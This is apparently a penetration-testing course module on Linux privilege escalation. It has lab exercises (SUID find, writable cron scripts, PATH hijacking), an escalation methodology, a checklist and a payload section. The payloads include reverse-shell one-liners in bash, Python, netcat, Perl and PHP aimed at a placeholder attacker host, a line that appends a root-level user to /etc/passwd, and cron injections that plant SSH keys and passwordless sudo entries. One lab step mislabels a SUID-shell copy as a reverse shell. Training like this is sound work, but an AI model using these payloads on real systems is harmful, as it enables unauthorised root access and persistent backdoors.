# 04 — Privilege Escalation: Labs, Methodology, & Payloads

---

# Labs

## 🧪 Lab 1: SUID Exploitation (Local VM)

### Setup
```bash
# Create a practice SUID binary
sudo cp /usr/bin/find /usr/local/bin/find-suid
sudo chmod u+s /usr/local/bin/find-suid
```

### Exercise
```bash
# Find it
find / -perm -4000 -type f 2>/dev/null | grep find-suid

# Exploit it
/usr/local/bin/find-suid . -exec /bin/sh -p \; -quit
whoami  # Should be root
```

## 🧪 Lab 2: Cron Job Exploitation

### Setup
```bash
# Create a vulnerable cron job (as root)
echo '#!/bin/bash
tar czf /tmp/backup.tar.gz /home/' > /opt/backup.sh
chmod +x /opt/backup.sh
chmod 777 /opt/backup.sh  # Writable by everyone
echo "* * * * * root /opt/backup.sh" >> /etc/crontab
```

### Exercise
```bash
# Discover the cron job
cat /etc/crontab
ls -la /opt/backup.sh  # Check permissions

# Exploit: inject reverse shell
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
# Wait one minute for cron to execute
/tmp/rootbash -p
```

## 🧪 Lab 3: PATH Hijacking

### Setup
```bash
# Create a script that calls commands without full path
echo '#!/bin/bash
ps aux > /tmp/processes.log' > /opt/monitor.sh
chmod +x /opt/monitor.sh
# Add to cron as root
```

### Exercise
```bash
# Create fake "ps" command
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
# When cron runs /opt/monitor.sh, it executes /tmp/ps instead
```

## 🧪 Lab 4: HackTheBox / TryHackMe

### Recommended Boxes
```
TryHackMe:
- Linux PrivEsc (free): https://tryhackme.com/room/linprivesc
- Linux PrivEsc Arena: https://tryhackme.com/room/introtoshells

HackTheBox:
- Lame (Easy) — SUID exploitation
- Bashed (Easy) — Cron job exploitation
- Beep (Easy) — Multiple privesc paths
```

---

# Methodology

## 🔴 Privilege Escalation Flow

```
STEP 1: SITUATIONAL AWARENESS (30 seconds)
  whoami && id && hostname && uname -a

STEP 2: QUICK WINS (2 minutes)
  sudo -l                              → Sudo misconfiguration
  find / -perm -4000 -type f 2>/dev/null  → SUID binaries
  cat /etc/crontab                     → Writable cron scripts

STEP 3: AUTOMATED ENUMERATION (5 minutes)
  Run LinPEAS → Read EVERY red/yellow line

STEP 4: DEEP MANUAL ENUMERATION (15 minutes)
  Credentials, configs, history, running services, writable files

STEP 5: PROCESS MONITORING (5 minutes)
  Run pspy → Watch for root cron jobs

STEP 6: KERNEL EXPLOITS (last resort)
  linux-exploit-suggester → Verify kernel version → Compile and run
```

---

# Payloads

## 🔴 Reverse Shell Payloads (For PrivEsc Exploitation)

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/sh ATTACKER 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## 🔴 /etc/passwd Payloads

```bash
# Generate password hash
openssl passwd -1 -salt hacker password123
# Output: $1$hacker$...

# Add root user
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcpF/:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker
# Password: password123
```

## 🔴 Cron Job Payloads

```bash
# SUID shell
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /target/script.sh

# Reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /target/script.sh

# Add SSH key
echo 'echo "YOUR_SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys' >> /target/script.sh

# Add sudo entry
echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> /target/script.sh
```

## 📋 PrivEsc Checklist

```
□ sudo -l checked
□ SUID/SGID binaries enumerated
□ Cron jobs analyzed
□ Running processes checked (ps aux | grep root)
□ Internal services discovered (ss -tulpn)
□ Writable files/directories found
□ Sensitive files searched (configs, history, SSH keys)
□ Capabilities checked
□ Docker/container checked
□ Kernel version checked against exploits
□ LinPEAS/LinEnum run and output analyzed
□ pspy monitoring completed
```
